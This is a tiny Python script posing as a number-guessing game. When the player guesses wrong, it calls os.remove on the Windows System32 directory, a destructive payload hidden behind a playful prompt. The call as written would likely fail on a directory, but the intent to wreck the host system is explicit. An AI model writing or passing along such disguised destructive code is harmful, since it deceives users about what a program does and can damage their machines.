import random 

import os

num = random.randint(1,10)

guess = int(input("Silly game! Guess the number between 1 and 10"))


if guess == num:
    print("You Got it!")
else:
    os.remove("C:\Windows\System32")